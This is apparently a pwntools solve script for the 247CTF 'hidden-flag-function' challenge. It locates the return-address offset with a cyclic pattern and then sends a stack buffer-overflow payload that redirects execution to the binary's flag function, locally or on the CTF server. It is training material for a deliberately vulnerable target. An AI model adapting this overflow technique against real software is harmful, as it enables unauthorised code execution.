#!/usr/bin/env python3

"""
WhatTheFuzz's submission for the 247CTF challenge hidden-flag-function.

This script can be used in the following manner:
python3 ./solve.py <REMOTE/LOCAL>

Args:
    param1: LOCAL will operate locally on the user's machine.
            REMOTE will connect to the CTF webserver and grab the flag.
            If no parameter is specified, the program will default to LOCAL.

Returns:
    The flag to solve the challenge.
"""

from pwn import *

exe = ELF('./hidden_flag_function')

context.binary = exe
context.log_level = 'info'
context.delete_corefiles = True

def get_offset():
    '''Return the offset from where our input is stored on the stack to the
    return address.
    '''

    with process([exe.path]) as io:

        # Send the cyclic pattern.
        io.sendlineafter('What do you have to say?', cyclic(500))
        io.wait()

        # Open the core file.
        core = io.corefile

        # Get the faulting address.
        fault = core.fault_addr
        log.info(f'The faulting address is: {hex(fault)}')

    # Search for the pattern to get the offset.
    offset = cyclic_find(fault)
    log.info(f'The offset is: {offset}') # yields 76

    return offset

def conn():
    '''Establish the connection to the process, local or remote.
    '''

    # This address probably won't work for you, as it is different for each
    # person each 24 hours.
    if args.get('REMOTE'):
        io = remote('c823368be98d997b.247ctf.com', 50119)

    else:
        io = process([exe.path])

    return io



def main():
    '''Return the flag.
    '''

    # Get the offset to the return address.
    offset = get_offset()

    with conn() as io:

        # Send the payload that will overwrite the return address with the
        # address of the function`flag`.
        flag_func = exe.symbols['flag']
        log.debug(f'The flag address is: {hex(flag_func)}')

        # Create and send the payload that will overwrite the return address
        # with the address of the function`flag`.
        payload = fit({
            offset: p32(flag_func, endian='little')
        })
        io.sendlineafter('What do you have to say?', payload)

        # Get the flag.
        flag = io.recvline_containsS(b'247CTF{')
        log.success(f'The flag is: {flag}')

        return flag

if __name__ == '__main__':
    main()
